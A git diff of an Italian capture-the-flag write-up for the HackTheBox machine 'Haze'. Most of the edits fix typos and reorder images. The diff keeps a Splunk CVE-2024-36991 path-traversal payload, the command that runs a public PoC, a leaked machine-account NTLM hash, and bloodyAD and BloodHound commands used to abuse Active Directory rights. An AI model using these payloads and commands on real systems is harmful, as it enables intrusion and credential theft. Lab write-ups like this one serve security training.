@@ -2,7 +2,7 @@
 
 ![Haze](./img/Haze.png)
 
-## **Reconnaossance**
+## **Reconnaissance**
 Si esegue una scansione delle porte TCP aperte della macchina target.
 ```bash
 $ nmap -p- --min-rate 1000 10.129.232.50 --open
@@ -41,7 +41,7 @@ PORT      STATE SERVICE
 56247/tcp open  unknown
 ```
 
-Con un'ulteriore scansione si raccolgono informazioni sui servizi espsoti.
+Con un'ulteriore scansione si raccolgono informazioni sui servizi esposti.
 ```bash
 $ nmap -p53,88,135,139,389,445,464,593,636,5985,8000,8088,8089,9389 -sCV 10.129.232.50
 ```
@@ -145,7 +145,7 @@ Si visita **https://haze.htb:8089**.
 
 ![02](./img/02.png)
 
-In cui si specifica la versione di Splunk, **9.2.1**.
+Viene specificata la versione di Splunk, **9.2.1**.
 
 ## **CVE-2024-36991**
 Le versioni di Splunk <9.2.2, 9,1.5 e la 9.0.10 sono vulnerabili ad attacchi di tipo **file inclusion**.
@@ -157,7 +157,7 @@ Payload:
 /en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd
 ```
 
-Si utilizza la PoC di **/bigb0x/CVE-2024-36991**.
+Si utilizza la PoC di [**/bigb0x/CVE-2024-36991**](https://github.com/bigb0x/CVE-2024-36991).
 
 ```bash
 $ python3 CVE-2024-36991/CVE-2024-36991.py -u http://haze.htb:8000
@@ -190,13 +190,13 @@ Gli hash non sono crackabili, quindi si cercando altre informazioni.
 
 Dalla documentazione di Splunk si individua la cartella delle configurazioni globali **$SPLUNK_HOME/etc/system/local/** e il file di configurazione per l'autenticazione **authentication.conf**.
 
-![03](./img/03.png)
-
 ![04](./img/04.png)
+
+![05](./img/05.png)
 
 Si modifica lo script per accedere al contenuto del file.
 
-![05](./img/05.png)
+![03](./img/03.png)
 
 ![06](./img/06.png)
 
@@ -459,13 +459,7 @@ SMB         DC01.haze.htb   445    DC01             [*] Windows Server 2022 Buil
 SMB         DC01.haze.htb   445    DC01             [+] haze.htb\Haze-IT-Backup$:cbdee8fc0e469b3a6bbafda64a73214e  
 ```
 
-```bash
-$ nxc ldap DC01.haze.htb -u 'Haze-IT-Backup$' -H 'cbdee8fc0e469b3a6bbafda64a73214e' -k
-```
-```
-LDAP        DC01.haze.htb   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
-LDAP        DC01.haze.htb   389    DC01             [+] haze.htb\Haze-IT-Backup$:cbdee8fc0e469b3a6bbafda64a73214e
-```
+Si raccolgono informazioni sull'account **Haze-IT-Backup$**.
 
 ![16](./img/16.png)
 
@@ -487,15 +481,15 @@ $ KRB5CCNAME=${PWD}/'Haze-IT-Backup$.ccache' bloodyAD --host DC01.haze.htb -d ha
 ```
 
 ### GenericAll
-Haze-IT-Backup$ ottiene i privilegi GenericAll su Support_Services**.
+Haze-IT-Backup$ ottiene i privilegi GenericAll su **Support_Services**.
 ```bash
 $ KRB5CCNAME=${PWD}/'Haze-IT-Backup$.ccache' bloodyAD --host DC01.haze.htb -d haze.htb -k add genericAll 'Support_Services' 'Haze-IT-Backup$' 
 ```
 ```
 [+] Haze-IT-Backup$ has now GenericAll on Support_Services
 ```
-
-Si raccolgono informazioni con l'account Haze-IT-Backup$.
+## **Information Gathering as Haze-IT-Backup$**
+Si raccolgono informazioni con l'account Haze-IT-Backup$ e le si analizzano con BloodHound.
 ```bash
 $ KRB5CCNAME=${PWD}/'Haze-IT-Backup$.ccache' bloodhound-python -d haze.htb -ns 10.129.58.53 -u 'Haze-IT-Backup$' -no-pass -k -c all --zip
 ```
@@ -521,7 +515,6 @@ INFO: Done in 00M 11S
 INFO: Compressing output into 20251112151600_bloodhound.zip
 ```
 
-Si utilizza BloodHound.
 ![17](./img/17.png)
 
 ### ForceChangePassword fails
